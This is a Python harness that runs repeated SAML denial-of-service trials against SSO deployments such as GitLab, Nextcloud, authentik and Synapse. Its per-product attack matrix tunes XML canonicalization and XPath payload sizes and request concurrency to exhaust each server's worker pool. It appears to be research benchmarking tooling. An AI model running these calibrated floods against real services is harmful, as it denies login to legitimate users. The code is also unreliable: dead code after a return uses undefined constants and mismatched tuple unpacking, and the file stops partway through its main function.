#!/usr/bin/env python3
"""bench_harness.py -- comparability harness for the SAML DoS targets.

Drives run_target.sh (up/down, with verification that each target is actually RUNNING then
actually STOPPED) and fire.py (idle control + N attack trials) across a set of heterogeneous
targets, on ONE fixed reference box (SIZE=medium = 8 vCPU / 16 GB), and aggregates every run
into a single comparable table.

WHY this is comparable despite heterogeneous targets/settings -- the three things a reviewer
checks, and how each is pinned here:

  1. COMMON CURRENCY, not attacker effort. The headline is NOT "we sent X Gbps". It is a cost
     ratio measured on the VICTIM: `unavailable_s / bytes_sent` = seconds a legitimate SSO request
     was denied, per byte the attacker spent. fire.py's background probe measures exactly this on
     every target the same way (served / shed / failed legit request on the same ACS/SSO endpoint),
     so the metric means the same thing for Synapse's one reactor and Apache's 150 prefork workers.
     Being a RATIO, it cancels the heterogeneous absolute scales (byte sizes, pool sizes) that make
     raw numbers incomparable.

  2. INTENSITY normalized to each server's own pool, not an absolute. We do not fire "150 requests"
     at everyone. We aim --max-inflight at each target's documented worker/concurrency model (POOL
     below), i.e. "saturate the pool and hold". Every target is thus measured at the same RELATIVE
     load. POOL is a reported per-target constant, not a hidden knob (verify-live commands are in
     fire.py's header and run_target.sh).

  3. FIXED resource box. Every target runs under SIZE=medium (set via the env var run_target.sh
     reads). We extended run_target.sh so ALL targets honour it (prefork ones ignore RAM for worker
     count, so their POOL stays 150 by design -- that is reported, not hidden).

  Plus the hygiene reviewers expect and that this harness produces:
    - an IDLE CONTROL per target (probe with no attack) proving the denial is caused by the attack;
    - N repeated trials with mean / median / stdev of the ratio (variance, not a single number);
    - a RECOVERY wait + re-verification between trials so each starts from a served baseline;
    - raw per-run JSON kept on disk so every table cell is traceable to its source run.

  What is deliberately per-target (and why that is honest, not a confound): --vector / --size /
  --slot. Each product canonicalizes a DIFFERENT reachable sink; firing one fixed payload would hit
  an inert slot on most of them (see fire.py's slot_for). We therefore fire an explicit ATTACK
  MATRIX per target (DEFAULT_SPECS / SPECS below): each applicable vector at a size calibrated to
  that product's request-time budget, every spec measured as its own row, and rely on the ratio to
  normalize the resulting byte differences. This is stated, not smuggled.

Usage:
  python3 bench_harness.py --list
  python3 bench_harness.py --targets ssp-sp,synapse,gitlab        # subset
  python3 bench_harness.py --all                                   # every target
  python3 bench_harness.py --all --repeats 5 --duration 180 --box medium
  python3 bench_harness.py --targets ssp-sp --dry-run             # print the plan, run nothing
"""
import argparse, hashlib, json, math, os, re, statistics, subprocess, sys, time

HERE = os.path.dirname(os.path.abspath(__file__))
RUN_TARGET = os.path.join(HERE, "run_target.sh")
FIRE = os.path.join(HERE, "fire.py")

# fire.py logical target -> (run_target.sh stack, POOL = --max-inflight aimed at the server's
# saturation knee). pool="cores" means the knee tracks the BOX's CPU grant (resolved by box_cpus()).
# POOL rationale (all verifiable live; see fire.py header):
#   prefork mod_php (ssp/nextcloud/moodle/drupal/wordpress): MaxRequestWorkers=150 workers, fixed and
#     CPU-independent -> denial is WORKER exhaustion at 150 (CPU saturates earlier -> caught by lat_x).
#   gitlab Puma:   the flood is CPU-bound (c14n pins a core for its whole run); threads add no
#     CPU-bound parallelism, so the knee is ~CORES, not workers x threads. Omnibus sizes workers to
#     host cores, so worker-pool and CPU-knee coincide at ~cores. CONFIRMED live: 20 in-flight on a
#     16-core host -> 91% 502. So pool tracks the CPU grant (medium=8). NB: --cpus caps CFS, but
#     GitLab reads host /proc for worker sizing, so workers may be ~host-cores while CPU is throttled
#     to the grant -- the knee still follows the grant. (Use --cpuset-cpus for a cleaner worker=grant.)
#   authentic2:    gunicorn sync WORKERS=16 (fixed by env, box-independent).
#   authentik:     gunicorn/uvicorn, CPU-bound xmlsec -> knee ~CORES = CPU grant (latency-separated;
#                  fire.py uses the heavy probe).
#   synapse:       single Twisted reactor -> pool of 1 (one c14n burn freezes the whole server).
TARGETS = {
    "ssp-idp":        dict(stack="ssp-idp",    pool=150),
    "ssp-sp":         dict(stack="ssp-sp",     pool=150),
    "nextcloud":      dict(stack="nextcloud",  pool=150),
    "moodle":         dict(stack="moodle",     pool=150),
    "drupal":         dict(stack="drupal",     pool=150),
    "wordpress":      dict(stack="wordpress",  pool=150),
    "gitlab":         dict(stack="gitlab",     pool=20),      # Puma workers track HOST cores, not the
                                                   #   8-core grant -> fill ~20 to black out the pool
    "authentic2-sp":  dict(stack="authentic2", pool=16),
    "authentic2-idp": dict(stack="authentic2", pool=16),
    "authentik-sp":   dict(stack="authentik",  pool=12),      # REAL pool = 3 workers x 4 gthreads (pinned in
                                                   #   run_target.sh). authentik kills+respawns workers under
                                                   #   the heavy canonicalization and sheds, so unlike the
                                                   #   queue-holders (deny at 1.1x) it needs a large overshoot
                                                   #   -- the multiplier required is itself a measured result
                                                   #   (sweep via --overshoot; 1.1x->~12%, ~19x->full denial).
    "synapse":        dict(stack="synapse",    pool=1),
}

# Per-target ATTACK MATRIX: the (vector, size) inputs fired at each target. Unlike POOL (relative
# intensity), the sink-reaching payload differs per product, so each target is swept over a set of
# vectors, each at a size calibrated to its request-time budget. Vector tokens are fire.py/
# saml_payloadgen aliases: cianide=C14N1D3(c14n-inc), flattr=FlAttr(attr), xplode=XPlode(xpath),
# wreckoncile=Wreckoncile(reconcile). Each spec is measured independently (its own N trials, its own
# row), sharing the target's single idle control as the latency baseline.
#
# DEFAULT_SPECS = products with a 30s request timeout (the common case); sizes put each vector's
# canonicalization near that 30s budget. SPECS overrides it wholesale for targets that differ:
#   gitlab        -- 60s timeout, but only cianide reaches a canonicalizing sink here;
#   authentik-sp  -- Django's 2.5MiB DATA_UPLOAD_MAX_MEMORY_SIZE gate means a payload must be far
#                    larger (in the generator's size knob) to clear the gate and still burn.
DEFAULT_SPECS = [
    ("cianide",     2400),    # C14N1D3     (c14n-inc); +20% for under-pinning targets
    ("flattr",      66000),   # FlAttr      (attr); +20%
    ("xplode",      78000),   # XPlode      (xpath); +20% (~64s/req on ssp-idp, N^3) -> pins a worker longer
    ("wreckoncile", 2880),    # Wreckoncile (reconcile); +20%
]
SPECS = {
    "gitlab":       [("c14n-inc", 2000)],                       # inc only, n=2K -> ~60s burn (its timeout).
                                                                #   GitLab rejects payloads >~240KB, so c14n-exc
                                                                #   can't be made potent -> use the literal
                                                                #   c14n-inc token so the exc failover never fires
    "authentik-sp": [("c14n-inc", 90000), ("flattr", 156000)],  # inclusive C14N1D3 (O(KN^2)); inc only
                                                                #   becomes potent at N~90k, still <2.5MiB gate.
                                                                #   literal c14n-inc token -> no exc failover
}


def specs_for(target):
    """The (vector, size) attack specs to fire at a target -- its override, else the 30s default."""
    return SPECS.get(target, DEFAULT_SPECS)


def box_cpus(box):
    """CPU grant of the fixed reference box -- the saturation knee for CPU-bound targets (pool='cores').
    small/medium match run_target.sh set_size_limits; unconstrained = the host's core count."""
    return {"small": 4, "medium": 8}.get(box, os.cpu_count() or 8)


def resolve_pool(target, box):
    raw = TARGETS[target]["pool"]
    return box_cpus(box) if raw == "cores" else raw

# run_target.sh probe path per stack is its own; we treat any 2xx/3xx as "up". These are the
# stack-level probe hostnames run_target.sh already knows; we just call `run_target.sh probe <stack>`.


def log(msg):
    print(f"[harness] {msg}", flush=True)


def run(cmd, env=None, timeout=None, capture=True):
    """Run a subprocess; return (rc, stdout, stderr). Never raises on non-zero rc."""
    e = dict(os.environ)
    if env:
        e.update(env)
    try:
        p = subprocess.run(cmd, env=e, timeout=timeout, text=True,
                           stdout=subprocess.PIPE if capture else None,
                           stderr=subprocess.PIPE if capture else None)
        return p.returncode, (p.stdout or ""), (p.stderr or "")
    except subprocess.TimeoutExpired as ex:
        return 124, (ex.stdout or "" if isinstance(ex.stdout, str) else ""), f"TIMEOUT after {timeout}s"


def probe_stack(stack):
    """Return (ok, time_s, code_str) from `run_target.sh probe <stack>`.
    ok = the backend answered with a 2xx/3xx inside the probe's own timeout."""
    rc, out, err = run([RUN_TARGET, "probe", stack], timeout=60)
    # cmd_probe prints:  probe <t> -> <url> : <time_total> <http_code>   (or '... : timeout')
    m = re.search(r":\s*([0-9.]+)\s+(\d{3})\s*$", out.strip())
    if not m:
        return False, None, (out.strip().split(":")[-1].strip() or "timeout")
    t_s, code = float(m.group(1)), m.group(2)
    return (code[0] in "23"), t_s, code


def verify_up(stack, boot_timeout):
    """Poll until the stack answers 2xx/3xx, or boot_timeout elapses. run_target.sh up already
    blocks on wait_http, so this is a confirmation, with slack for slow boots (GitLab)."""
    deadline = time.time() + boot_timeout
    last = None
    while time.time() < deadline:
        ok, t_s, code = probe_stack(stack)
        last = code
        if ok:
            return True, t_s, code
        time.sleep(5)
    return False, None, last


def verify_down(stack, timeout=90):
    """Confirm the stack is actually STOPPED: the probe must stop answering (conn refused/timeout,
    i.e. no 2xx/3xx) AND no container of that name remains in `docker ps`."""
    deadline = time.time() + timeout
    while time.time() < deadline:
        ok, _, code = probe_stack(stack)
        rc, out, _ = run(["docker", "ps", "--format", "{{.Names}}"], timeout=30)
        names = out.split()
        # the stack's app container is named for the stack (or stack-poc); match loosely
        still = [n for n in names if n == stack or n.startswith(stack + "-") or n == stack + "-poc"]
        if (not ok) and (not still):
            return True, code, still
        time.sleep(3)
    return False, code, still


def wait_recovered(target, stack, settle_timeout):
    """After an attack, wait for the target to serve a legit probe again before the next trial, so
    each trial starts from the same served baseline (and the residual flood has drained). Returns
    (recovered, served_s). If it never recovers, the caller restarts the stack."""
    deadline = time.time() + settle_timeout
    while time.time() < deadline:
        ok, t_s, code = probe_stack(stack)
        if ok and (t_s is None or t_s < 2.0):   # answered AND fast -> workers freed
            return True, t_s
        time.sleep(3)
    return False, None


def fire(target, max_inflight, duration, json_path, probe_only=None, vector=None, size=None,
         probe_size=None, probe_vector=None, probe_floor=None, calibrate=None, probe_timeout=None):
    """Invoke fire.py for one run (attack or idle control). Returns the parsed JSON dict (or None).
    probe_size/probe_vector/probe_floor select fire.py's WORK-DOING probe (served-vs-shed by
    latency) -- forwarded to the idle control too, so its served latency calibrates the floor."""
    probe_args = []
    if probe_size is not None:   probe_args += ["--probe-size", str(probe_size)]
    if probe_vector:             probe_args += ["--probe-vector", probe_vector]
    if probe_floor is not None:  probe_args += ["--probe-floor", str(probe_floor)]
    if calibrate is not None:
        cmd = [sys.executable, FIRE, "--target", target, "--calibrate", str(calibrate),
               "--json", json_path] + probe_args
        if probe_timeout is not None:
            cmd += ["--probe-timeout", str(probe_timeout)]
        per_probe = probe_timeout if probe_timeout else 30
        timeout = 60 + calibrate * (per_probe + 5)   # N sequential probes at this timeout
    elif probe_only is not None:
        cmd = [sys.executable, FIRE, "--target", target, "--probe-only", str(probe_only),
               "--json", json_path] + probe_args
        timeout = probe_only + 120
    else:
        cmd = [sys.executable, FIRE, "--target", target, "--max-inflight", str(max_inflight),
               "--duration", str(duration), "--probe", "--json", json_path] + probe_args
        if vector:        cmd += ["--vector", vector]
        if size is not None: cmd += ["--size", str(size)]
        # fire.py keeps probing through the drain after --duration; allow generous slack for
        # in-flight heavy canonicalizations (authentik single request is 40s+) to complete.
        timeout = duration + 600
    rc, out, err = run(cmd, timeout=timeout)
    if out:
        print(out, end="" if out.endswith("\n") else "\n", flush=True)
    if rc != 0:
        log(f"  !! fire.py rc={rc} target={target} ({'calibrate' if calibrate is not None else 'idle' if probe_only else 'attack'})")
        if err:
            print(err[-800:], file=sys.stderr, flush=True)
    try:
        with open(json_path) as f:
            return json.load(f)
    except Exception as ex:
        log(f"  !! could not read {json_path}: {ex}")
        return None


def stack_down(stack):
    log(f"down {stack} ...")
    run([RUN_TARGET, "down", stack], timeout=180)
    ok, code, still = verify_down(stack)
    if ok:
        log(f"  verified STOPPED ({stack}: probe={code}, no containers)")
    else:
        log(f"  !! {stack} may NOT be fully stopped (probe={code}, containers={still})")
    return ok


def stack_up(stack, box, boot_timeout):
    log(f"up {stack} (SIZE={box}) ... (stops other targets first; builds on first run)")
    rc, out, err = run([RUN_TARGET, "up", stack], env={"SIZE": box}, timeout=boot_timeout + 300)
    if out:
        # run_target.sh is chatty; show its tail so a build/boot failure is visible
        print("\n".join(out.splitlines()[-12:]), flush=True)
    if rc != 0:
        log(f"  !! up {stack} rc={rc}")
        if err:
            print(err[-800:], file=sys.stderr, flush=True)
        return False
    ok, t_s, code = verify_up(stack, boot_timeout)
    if ok:
        log(f"  verified RUNNING ({stack}: probe {code} in {t_s:.2f}s)")
    else:
        log(f"  !! {stack} did not come up (last probe={code})")
    return ok


def preflight(stacks, box, boot_timeout):
    """Bring every selected stack up (BUILDING its image on first run), verify it answers, then tear
    it down -- BEFORE committing to the full campaign. Catches a broken build / failed boot early
    (and warms the Docker image cache so the measurement `up` only re-runs container setup). Returns
    the set of HEALTHY stacks."""
    log(f"=== PRE-FLIGHT: building + verifying {len(stacks)} stack(s) before measuring ===")
    healthy, status = set(), {}
    for stack in stacks:
        ok_up = stack_up(stack, box, boot_timeout)
        status[stack] = "READY" if ok_up else "FAILED"
        if ok_up:
            healthy.add(stack)
        stack_down(stack)
    log("=== PRE-FLIGHT readiness ===")
    for stack in stacks:
        log(f"  {stack:<12} {status[stack]}")
    if len(healthy) < len(stacks):
        log(f"  !! {len(stacks) - len(healthy)} stack(s) NOT ready: "
            f"{', '.join(s for s in stacks if s not in healthy)}")
    return healthy


# ---- work-probe auto-calibration (once per target+box, cached) -----------------------------
CALIB_Z = 3.0                       # separation confidence: served vs shed clouds >= Z*combined-sigma
CALIB_N = 4                         # probes per size step (first discarded as warmup)
CALIB_RAMP = [100, 300, 800, 2000, 5000, 12000, 30000]   # ascending --size ramp (stops before too-big)
CALIB_T_HI = 2.0                   # a served probe slower than this (or timed out) = too expensive -> stop
CALIB_BODY_CAP = 2_621_440         # 2.5 MiB = authentik-sp Django DATA_UPLOAD_MAX_MEMORY_SIZE, the
                                   # most restrictive known gate; never probe with a body larger (reject risk)
CALIB_CACHE = "probe_calib.json"

def _calib_probe_timeout():
    return CALIB_T_HI + 3.0         # abort an over-expensive calibration probe shortly past T_HI


def pins_hash():
    """Fingerprint run_target.sh's pinned-image block so calibration auto-invalidates when an image
    pin changes (served latency is image-specific). Falls back to hashing the whole file."""
    try:
        txt = open(RUN_TARGET).read()
        imgs = "\n".join(l for l in txt.splitlines() if l.startswith("IMG_") or l.strip().startswith("FROM "))
        return hashlib.sha1((imgs or txt).encode()).hexdigest()[:12]
    except Exception:
        return "nofile"


def _cache_path(outdir):
    return os.path.join(outdir, CALIB_CACHE)


def load_calib(outdir):
    try:
        with open(_cache_path(outdir)) as f:
            return json.load(f)
    except Exception:
        return {}


def save_calib(outdir, cache):
    try:
        with open(_cache_path(outdir), "w") as f:
            json.dump(cache, f, indent=2)
    except Exception as ex:
        log(f"  !! could not write calibration cache: {ex}")


def fire_targets():
    """Load fire.py's TARGETS dict so the harness can honour a target's HAND-TUNED work-probe
    (probe_vector/probe_size/probe_floor) instead of auto-calibrating one. Importing fire.py runs
    only its module-level definitions (main() is __main__-guarded). Returns {} on any failure."""
    try:
        import importlib.util
        spec = importlib.util.spec_from_file_location("_fire_mod", FIRE)
        mod = importlib.util.module_from_spec(spec)
        spec.loader.exec_module(mod)
        return getattr(mod, "TARGETS", {}) or {}
    except Exception as ex:
        log(f"  (could not import fire.py TARGETS for declared probes: {ex})")
        return {}


def target_vectors(outdir):
    """Map each fire.py target -> its own calibrated default vector (the one known to reach a sink),
    parsed once from `fire.py --list`. The work-probe uses this, NOT the attack vector: it only needs
    to be a legit request that does real work, so one calibration per target serves every attack."""
    rc, out, _ = run([sys.executable, FIRE, "--list"], timeout=60)
    vmap = {}
    for line in out.splitlines():
        m = re.search(r"^\s*(\S+)\s+\S+\s+default=(\S+)", line)
        if m:
            vmap[m.group(1)] = m.group(2)
    return vmap


def _probe_dist(target, probe_vector, size, outdir):
    """Fire CALIB_N sequential probes (warmup discarded in fire.py) at (probe_vector, size) with a SHORT
    timeout and return (median, stdev, served_n, body_bytes). median is None if nothing served within
    the timeout (-> the probe is too expensive at this size). size=None -> minimal size-1 baseline."""
    tag = "base" if size is None else str(size)
    jp = os.path.join(outdir, f"{target}.calib-{tag}.json")
    res = fire(target, None, 0.0, jp, calibrate=CALIB_N, probe_timeout=_calib_probe_timeout(),
               probe_size=size, probe_vector=(probe_vector if size is not None else None))
    sv = (res or {}).get("served", {})
    return sv.get("median"), (sv.get("stdev") or 0.0), sv.get("n", 0), (res or {}).get("body_bytes")


def calibrate_target(target, box, outdir, vmap, recalibrate):
    """Return a calibration dict {probe_vector, probe_size, floor, mu_served, mu_reject, ...} for a
    target, computing it (and caching) if needed.

    Finds a probe that does a BOUNDED amount of real work -- served latency in [T_LO, T_HI], clearly
    above the trivial/shed baseline but short of a timeout -- with a body under CALIB_BODY_CAP. It
    ramps the --size UP and STOPS at the first size that times out, serves slower than T_HI, or whose
    body exceeds the cap: beyond that point a super-linear vector either does too much work (timeout)
    or has its oversized body fast-REJECTED (which looks deceptively 'served'), so we must not climb
    into it. The floor is set just above the shed cloud and below the served cloud (safe: a served
    probe can never read as shed). Not gateable (floor=0, minimal probe) when no size lands in band --
    e.g. a vector so potent that even a small body already times out; there, status/timeout detection
    carries the denial signal instead."""
    cache = load_calib(outdir)
    key = f"{target}|{box}"
    ph = pins_hash()
    ent = cache.get(key)
    if ent and not recalibrate and ent.get("pins_hash") == ph:
        log(f"  calib[{target}] cache hit: probe={ent['probe_vector']}@{ent['probe_size']} "
            f"floor={ent['floor']}s (gateable={ent['gateable']})")
        return ent

    pvec = vmap.get(target) or "c14n-inc"
    mu_r, sig_r, _, _ = _probe_dist(target, pvec, None, outdir)       # size-1 shed/trivial baseline
    t_lo = max(5 * (mu_r or 0.0), 0.1)
    best = None                                                      # (size, mu_s, sig_s): largest in-band
    last_size = last_body = None
    if mu_r is not None:
        for size in CALIB_RAMP:
            # extrapolate the body from the last probed size (body grows monotonically with --size);
            # stop BEFORE sending an over-cap probe rather than paying to discover it's too big.
            if last_body is not None and last_body * (size / last_size) > CALIB_BODY_CAP:
                log(f"  calib[{target}] size={size}: predicted body > {CALIB_BODY_CAP/1e6:.0f}MB cap -> stop")
                break
            mu_s, sig_s, n, body = _probe_dist(target, pvec, size, outdir)
            if body is not None:
                last_size, last_body = size, body
            if body is not None and body > CALIB_BODY_CAP:
                log(f"  calib[{target}] size={size}: body {body/1e6:.1f}MB > cap -> stop (bigger only rejects)")
                break
            if mu_s is None or mu_s > CALIB_T_HI:                     # timed out / too expensive
                log(f"  calib[{target}] size={size}: served={'timeout' if mu_s is None else f'{mu_s:.3f}s'} "
                    f"> T_HI {CALIB_T_HI:g}s -> stop (bigger is worse within the processed regime)")
                break
            log(f"  calib[{target}] size={size}: served~{mu_s:.3f}s (sd {sig_s:.3f}) vs "
                f"base {mu_r:.3f}s (sd {sig_r:.3f}); body={None if body is None else f'{body/1e6:.1f}MB'}")
            if mu_s >= t_lo:                                          # in band -> candidate (keep largest)
                best = (size, mu_s, sig_s)

    gateable, floor, psize = False, 0.0, None
    if best is not None:
        size, mu_s, sig_s = best
        sep = mu_s - mu_r
        need = CALIB_Z * ((sig_s ** 2 + sig_r ** 2) ** 0.5)
        cand_floor = round(mu_r + CALIB_Z * sig_r, 3)                 # just above the shed cloud
        if sep >= need and cand_floor < (mu_s - CALIB_Z * sig_s):     # separated AND floor safely below served
            gateable, floor, psize = True, cand_floor, size
    ent = dict(probe_vector=pvec, probe_size=psize, floor=floor,
               mu_served=(best[1] if best else None), mu_reject=mu_r,
               sigma_served=(best[2] if best else None), sigma_reject=sig_r,
               gateable=gateable, box=box, pins_hash=ph,
               calibrated_at=time.strftime("%Y-%m-%dT%H:%M:%S"))
    log(f"  calib[{target}] => probe={pvec}@{psize} floor={floor}s gateable={gateable}" +
        ("" if gateable else "  (no bounded-work probe size here -> minimal probe, no gating)"))
    cache[key] = ent; save_calib(outdir, cache)
    return ent

    pvec = vmap.get(target) or "c14n-inc"
    mu_r, sig_r, _ = _probe_dist(target, pvec, None, outdir)          # size-1 shed/trivial baseline
    if mu_r is None:
        log(f"  calib[{target}] baseline probe never served; leaving work-probe OFF")
        ent = dict(probe_vector=pvec, probe_size=None, floor=0.0, mu_served=None, mu_reject=None,
                   sigma_served=None, sigma_reject=None, gateable=False, box=box, pins_hash=ph,
                   calibrated_at=time.strftime("%Y-%m-%dT%H:%M:%S"))
        cache[key] = ent; save_calib(outdir, cache); return ent

    best = None
    for size in CALIB_RAMP:
        mu_s, sig_s, n = _probe_dist(target, pvec, size, outdir)
        if mu_s is None:
            continue
        best = (size, mu_s, sig_s)
        sep = mu_s - mu_r
        need = CALIB_Z * ((sig_s ** 2 + sig_r ** 2) ** 0.5)
        log(f"  calib[{target}] size={size}: served~{mu_s:.3f}s (sd {sig_s:.3f}) vs "
            f"base {mu_r:.3f}s (sd {sig_r:.3f}); sep={sep:.3f} need={need:.3f}")
        if mu_s >= CALIB_TARGET_S or (sep >= need and mu_s >= CALIB_ABS_MIN_S):
            break

    gateable = False
    floor = 0.0
    psize = None
    if best is not None:
        size, mu_s, sig_s = best
        sep = mu_s - mu_r
        need = CALIB_Z * ((sig_s ** 2 + sig_r ** 2) ** 0.5)
        cand_floor = round(mu_r + CALIB_Z * sig_r, 3)                 # just above the shed cloud
        # usable only if that floor still sits safely BELOW the served cloud and the clouds separate
        if sep >= need and mu_s >= CALIB_ABS_MIN_S and cand_floor < (mu_s - CALIB_Z * sig_s):
            gateable, floor, psize = True, cand_floor, size
    ent = dict(probe_vector=pvec, probe_size=psize, floor=floor,
               mu_served=(best[1] if best else None), mu_reject=mu_r,
               sigma_served=(best[2] if best else None), sigma_reject=sig_r,
               gateable=gateable, box=box, pins_hash=ph,
               calibrated_at=time.strftime("%Y-%m-%dT%H:%M:%S"))
    log(f"  calib[{target}] => probe={pvec}@{psize} floor={floor}s gateable={gateable}" +
        ("" if gateable else "  (no served/shed separation -> minimal probe, no gating)"))
    cache[key] = ent; save_calib(outdir, cache)
    return ent


def _run_trials(target, stack, a, mi, file_tag, gen_vector, size, psz, pvec, pfloor):
    """Fire a.repeats attack trials of (gen_vector, size), recovering/restarting between trials.
    file_tag names the per-trial JSON; gen_vector is the actual --vector passed to fire.py (may differ
    from the spec label, e.g. the c14n-exc failover). Returns the list of per-trial result dicts."""
    trials = []
    for r in range(a.repeats):
        ok, _ = wait_recovered(target, stack, a.settle)
        if not ok:
            log(f"     did not recover before {gen_vector} trial {r+1}; restarting stack")
            stack_down(stack)
            if not stack_up(stack, a.box, a.boot_timeout):
                log("     !! restart failed; aborting remaining trials for this spec")
                break
        rj = os.path.join(a.outdir, f"{target}.{file_tag}.attack.{r+1}.json")
        log(f"     trial {r+1}/{a.repeats} (vector={gen_vector}, size={size}) ...")
        res = fire(target, mi, a.duration, rj, vector=gen_vector, size=size,
                   probe_size=psz, probe_vector=pvec, probe_floor=pfloor)
        if res:
            trials.append(res)
    return trials


def _aggregate(trials):
    """Reduce per-trial results to headline metrics (ratio mean/median/stdev, unavail/bytes means,
    attack latency, inert flag)."""
    m = {"trials": len(trials)}
    ratios = [t["totals"]["ratio_unavail_s_per_byte"] for t in trials
              if t.get("totals", {}).get("ratio_unavail_s_per_byte") is not None]
    unavail = [t["totals"]["unavailable_s"] for t in trials if t.get("totals")]
    bytes_ = [t["totals"]["bytes_sent"] for t in trials if t.get("totals")]
    m["ratios_unavail_s_per_byte"] = ratios
    if ratios:
        m["ratio_mean"] = statistics.mean(ratios)
        m["ratio_median"] = statistics.median(ratios)
        m["ratio_stdev"] = statistics.stdev(ratios) if len(ratios) > 1 else 0.0
        m["unavail_s_mean"] = statistics.mean(unavail) if unavail else None
        m["bytes_sent_mean"] = statistics.mean(bytes_) if bytes_ else None
    lat = [t["probes"]["sustain"]["avg_served_s"] for t in trials
           if t.get("probes", {}).get("sustain", {}).get("avg_served_s") is not None]
    if lat:
        m["attack_lat_s"] = statistics.mean(lat)
    m["inert"] = bool(trials) and sum(1 for t in trials if t.get("requests", {}).get("inert")) == len(trials)
    return m


def _stronger(x, y):
    """Is result x a stronger denial than y? Higher hard-denial ratio wins; if both ~0, the larger
    slowdown (attack latency) wins."""
    rx, ry = (x.get("ratio_mean") or 0.0), (y.get("ratio_mean") or 0.0)
    if rx != ry:
        return rx > ry
    return (x.get("attack_lat_s") or 0.0) > (y.get("attack_lat_s") or 0.0)


def main():
    ap = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
    g = ap.add_mutually_exclusive_group()
    g.add_argument("--targets", help="comma-separated fire.py targets (see --list)")
    g.add_argument("--all", action="store_true", help="run every target")
    ap.add_argument("--list", action="store_true", help="list targets + their stack/pool and exit")
    ap.add_argument("--box", default="medium", choices=["small", "medium", "unconstrained"],
                    help="fixed reference box (SIZE for run_target.sh); default medium = 8 vCPU/16 GB")
    ap.add_argument("--duration", type=float, default=120.0, help="attack duration per trial (s)")
    ap.add_argument("--repeats", type=int, default=1, help="attack trials per target (default 1; raise for variance)")
    ap.add_argument("--overshoot", type=float, default=1.1,
                    help="drive --max-inflight at ceil(pool * overshoot) so the pool stays CONTINUOUSLY "
                         "saturated (a request is always queued behind a freed slot); default 1.1")
    ap.add_argument("--preflight", action="store_true",
                    help="before measuring, build + verify every selected stack (up->verify->down), "
                         "then measure only the healthy ones")
    ap.add_argument("--preflight-only", action="store_true",
                    help="run the build/verify readiness pass and exit (don't measure)")
    ap.add_argument("--idle", type=float, default=20.0, help="idle-control probe duration per target (s)")
    ap.add_argument("--boot-timeout", type=float, default=900.0,
                    help="max wait for a stack to come up (GitLab boots slowly); default 900s")
    ap.add_argument("--settle", type=float, default=90.0,
                    help="max wait for recovery between trials before restarting the stack")
    ap.add_argument("--work-probe", action=argparse.BooleanOptionalAction, default=True,
                    help="use fire.py's WORK-DOING liveness probe on EVERY target (not just those that "
                    "declare one), with a shed floor auto-calibrated per spec from an idle probe. Tells "
                    "served-from-shed by latency as a fallback where the status code can't (comparable "
                    "across all targets). --no-work-probe reverts to minimal probes.")
    ap.add_argument("--recalibrate", action="store_true",
                    help="force work-probe re-calibration even if a cached entry exists for this "
                    "(target, box); otherwise the cache in harness_runs/probe_calib.json is reused")
    ap.add_argument("--c14n-failover", action=argparse.BooleanOptionalAction, default=True,
                    help="for the cianide (C14N1D3) spec: if inclusive C14N (c14n-inc) reaches no "
                    "hard denial on a target, also fire the exclusive variant (c14n-exc) and keep the "
                    "stronger. inc/exc is a MODIFIER of the vector, so this reports the better modifier. "
                    "--no-c14n-failover fires c14n-inc only.")
    ap.add_argument("--c14n-exc-size", type=int, default=30000,
                    help="size for the c14n-exc failover run (exclusive C14N is O(N^2) vs inclusive's "
                    "O(K*N^2), so it needs a larger payload than the cianide/inc size to match; "
                    "default 30000, in line with the c14n-exc sizes in fire.py)")
    ap.add_argument("--outdir", default=os.path.join(HERE, "harness_runs"),
                    help="where per-run JSON + the aggregate land")
    ap.add_argument("--keep-up", action="store_true", help="don't bring the last stack down at the end")
    ap.add_argument("--dry-run", action="store_true", help="print the plan; run nothing")
    a = ap.parse_args()

    if a.list:
        print(f"POOL resolved for SIZE={a.box} (CPU grant = {box_cpus(a.box)} cores); "
              f"mi = ceil(pool * {a.overshoot:g})")
        print(f"{'TARGET':<16} {'STACK':<12} {'POOL':>5} {'mi':>4}  basis")
        for name, c in TARGETS.items():
            pool = resolve_pool(name, a.box)
            mi = max(1, math.ceil(pool * a.overshoot))
            basis = "CPU grant (cores-tied)" if c["pool"] == "cores" else "fixed worker pool"
            specstr = " ".join(f"{v}:{sz}" for v, sz in specs_for(name))
            print(f"{name:<16} {c['stack']:<12} {pool:>5} {mi:>4}  {basis}")
            print(f"{'':<16} {'':<12} {'':>5} {'':>4}  specs: {specstr}")
        return 0

    if a.all:
        sel = list(TARGETS)
    elif a.targets:
        sel = [t.strip() for t in a.targets.split(",") if t.strip()]
    else:
        ap.error("choose --all or --targets <list> (or --list)")
    for t in sel:
        if t not in TARGETS:
            ap.error(f"unknown target '{t}'; known: {', '.join(TARGETS)}")

    # Group selected targets by stack so a shared stack (authentic2-sp/-idp, authentik) comes up once.
    by_stack = {}
    for t in sel:
        by_stack.setdefault(TARGETS[t]["stack"], []).append(t)

    plan = {s: ts for s, ts in by_stack.items()}
    log(f"box=SIZE={a.box}  duration={a.duration:g}s  repeats={a.repeats}  idle={a.idle:g}s  "
        f"overshoot={a.overshoot:g} (max-inflight = ceil(pool*overshoot))")
    log(f"plan: {json.dumps(plan)}")
    if a.dry_run:
        log("dry-run: nothing executed.")
        return 0

    os.makedirs(a.outdir, exist_ok=True)
    vmap = target_vectors(a.outdir) if a.work_probe else {}   # target -> its default probe vector
    ftargets = fire_targets() if a.work_probe else {}         # target -> fire.py config (declared probes)
    results = {}   # target -> record

    stacks = list(by_stack)

    if a.preflight or a.preflight_only:
        healthy = preflight(stacks, a.box, a.boot_timeout)
        if a.preflight_only:
            return 0 if healthy == set(stacks) else 1
        for stack in stacks:
            if stack not in healthy:
                for t in by_stack[stack]:
                    results[t] = dict(stack=stack, error="failed pre-flight (build/boot)")
        stacks = [s for s in stacks if s in healthy]

    for si, stack in enumerate(stacks):
        if not stack_up(stack, a.box, a.boot_timeout):
            for t in by_stack[stack]:
                results[t] = dict(error="stack did not come up")
            continue

        for target in by_stack[stack]:
            pool = resolve_pool(target, a.box)
            mi = max(1, math.ceil(pool * a.overshoot))   # overshoot keeps the pool continuously pinned
            specs = specs_for(target)
            log(f"== {target} (stack={stack}, pool={pool}, max-inflight={mi}, "
                f"vectors={', '.join(v for v, _ in specs)}) ==")

            # 1) work-probe auto-calibration -- ONCE per (target, box), cached. Grows a probe at the
            #    target's own default vector until served latency separates from the shed baseline,
            #    then fixes (probe_size, floor). Reused across every attack vector for this target.
